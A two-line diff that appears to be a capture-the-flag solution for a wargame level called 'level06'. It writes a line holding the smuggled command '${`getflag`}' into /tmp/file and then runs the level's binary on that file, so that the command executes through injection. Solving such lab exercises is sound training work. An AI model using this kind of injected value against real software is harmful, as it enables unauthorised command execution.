@@ -1,0 +1,2 @@
+echo "[ft \${\`getflag\`}]" > /tmp/file
+./level06 /tmp/file
